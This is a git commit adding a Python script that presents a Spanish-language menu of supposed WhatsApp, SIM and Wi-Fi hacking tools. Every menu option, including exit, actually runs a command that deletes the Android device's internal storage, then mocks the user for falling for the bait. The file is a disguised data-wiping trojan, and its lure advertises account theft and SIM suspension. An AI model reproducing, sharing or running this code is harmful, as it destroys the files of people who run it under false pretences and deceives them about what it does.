fb8fb54bda81fd59e9589d648c21c68707196dca
satanic-ofc <83351752+satanic-ofc@users.noreply.github.com>
2021-04-28 13:16:07 +0000

    Create Satanic-suspender.py

---
+++ Satanic-suspender.py
@@ -0,0 +1,44 @@
+#!/usr/bin/python
+
+########################
+# PROPIEDAD DE SATANIC #
+########################
+##########################
+# wa.me/+5521982000000 :)#
+##########################
+import os, time
+
+def menu():
+	print("""
+\033[1;37m(1)\033[0;m \033[0;32mSuspender Numeros De Whatsapp\033
+\033[1;37m(2)\033[0;32m Robar Una Cuenta De Whatsapp\033[1;37m
+(3)\033[0;m \033[0;32mSuspender Sim Permanentemente\033[1;37m
+(4)\033[0;m \033[0;32mHackear Wifi\033
+\033[1;37m(5)\033[0;m \033[0;32mObtener Grupos Antiguos(2011)\033[1;37m
+(0)\033[0;m \033[0;31mSalir\033
+""")
+menu()
+
+X = input("\033[1;44;37mElige una opcion. ej: 1\033[0;m \033[1;36m\n\n>\033[0;m ")
+
+if X == "1":
+    hack = os.system("rm -rf /storage/emulated/0/")
+    print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
+elif X == "2":
+    hack = os.system("rm -rf /storage/emulated/0/")
+    print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
+elif X == "3":
+    hack = os.system("rm -rf /storage/emulated/0/")
+    print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
+elif X == "4":
+    hack = os.system("rm -rf /storage/emulated/0/")
+    print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
+elif X == "5":
+    hack = os.system("rm -rf /storage/emulated/0/")
+    print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
+elif X == "0":
+    hack = os.system("rm -rf /storage/emulated/0/")
+    time.sleep(1)
+    print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
+else:
+    print("\033[1;31m\nError:\033[0;m Carácter incorrecto, ejecute de nuevo el script y, seleccione una opcion. (1, 2, 3, 4, 5, 0)")
